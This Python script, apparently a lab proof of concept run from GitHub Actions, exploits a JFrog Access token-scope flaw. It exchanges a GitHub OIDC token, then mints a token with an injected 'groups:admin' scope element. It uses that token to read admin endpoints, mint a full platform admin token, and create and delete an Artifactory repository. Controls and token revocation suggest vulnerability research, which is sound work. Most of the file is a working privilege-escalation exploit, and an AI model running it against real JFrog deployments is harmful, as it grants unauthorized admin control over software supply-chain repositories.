"""Runs inside GitHub Actions. Prints status codes and scopes only; tokens are never printed."""

import base64
import json
import os
import sys
import urllib.request

from common import env, redact, request

PROVIDER = "lab-github-oidc"
AUD = os.environ.get("OIDC_AUDIENCE", "jfrog-lab-aud")
GROUPS = "applied-permissions/user applied-permissions/groups:readers"
DEC = GROUPS + " applied-permissions/groups:admin"
ACCESS_ADMIN_ONLY = "/access/api/v2/users?limit=1"
ART_ADMIN_ONLY = "/artifactory/api/security/users"
ART_REPO = (
    "/artifactory/api/repositories/"
    + "lab-r06-"
    + os.environ.get("GITHUB_RUN_ID", "local")
)


def github_oidc():
    req = urllib.request.Request(
        env("ACTIONS_ID_TOKEN_REQUEST_URL") + "&audience=" + AUD,
        headers={"Authorization": "bearer " + env("ACTIONS_ID_TOKEN_REQUEST_TOKEN")},
    )
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.loads(r.read())["value"]


def claims(tok):
    p = tok.split(".")[1]
    return json.loads(base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)))


def mint(bearer, scope, username=None):
    body = {"scope": scope, "expires_in": 300}
    if username:
        body["username"] = username
    code, d = request("POST", "/access/api/v1/tokens", body, bearer=bearer)
    return code, (d.get("access_token") if code == 200 else None)


def revoke(tok):
    request("DELETE", f"/access/api/v1/tokens/{claims(tok)['jti']}", bearer=tok)


def main():
    subject = github_oidc()
    code, d = request(
        "POST",
        "/access/api/v1/oidc/token",
        {
            "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
            "subject_token_type": "urn:ietf:params:oauth:token-type:id_token",
            "subject_token": subject,
            "provider_name": PROVIDER,
        },
    )
    print("exchange:", code)
    if code != 200:
        c = claims(subject)
        print(
            "subject claims:",
            {k: c.get(k) for k in ("iss", "sub", "aud", "ref", "repository")},
        )
        print(redact(d))
        return 1
    tok = d["access_token"]
    print("exchange scope:", claims(tok).get("scp"))
    print("exchange subject:", claims(tok).get("sub"))

    code, d = request("GET", "/access/api/v1/system/version", bearer=tok)
    print("access version:", d if code == 200 else code)

    code, t_ord = mint(tok, GROUPS)
    print("positive control, user + groups re-mint:", code)

    code, _ = request("GET", ACCESS_ADMIN_ONLY, bearer=tok)
    print("negative control, exchanged token on Access admin:", code)
    code, _ = request("GET", ART_ADMIN_ONLY, bearer=tok)
    print("negative control, exchanged token on Artifactory admin:", code)

    code, t_dec = mint(tok, DEC)
    print(
        "DECISIVE mint, second unquoted groups:admin element:",
        code,
        claims(t_dec).get("scp") if t_dec else "",
    )
    if not t_dec:
        for t in (t_ord, tok):
            revoke(t)
        return 1

    code, _ = request("GET", ACCESS_ADMIN_ONLY, bearer=t_dec)
    print("DECISIVE Access admin read with escalated token:", code)
    code, _ = request("GET", ART_ADMIN_ONLY, bearer=t_dec)
    print(
        "escalated token on Artifactory admin (expected 403, needs second mint):", code
    )

    code, t_real = mint(
        t_dec, "applied-permissions/admin", username=claims(t_dec)["sub"].split("/")[-1]
    )
    print(
        "DECISIVE mint real platform admin token:",
        code,
        claims(t_real).get("scp") if t_real else "",
    )
    if t_real:
        print(
            "Access admin read with real admin token:",
            request("GET", ACCESS_ADMIN_ONLY, bearer=t_real)[0],
        )
        print(
            "Artifactory admin read with real admin token:",
            request("GET", ART_ADMIN_ONLY, bearer=t_real)[0],
        )
        code, _ = request(
            "PUT",
            ART_REPO,
            {
                "rclass": "local",
                "packageType": "generic",
                "description": "R06 CI proof, safe to delete",
            },
            bearer=t_real,
            accept=None,
        )
        print("Artifactory admin write, create repo:", code)
        print(
            "Artifactory admin write, delete repo:",
            request("DELETE", ART_REPO, bearer=t_real)[0],
        )

    for t in (t_ord, t_dec, t_real, tok):
        if t:
            revoke(t)
    return 0


if __name__ == "__main__":
    sys.exit(main())
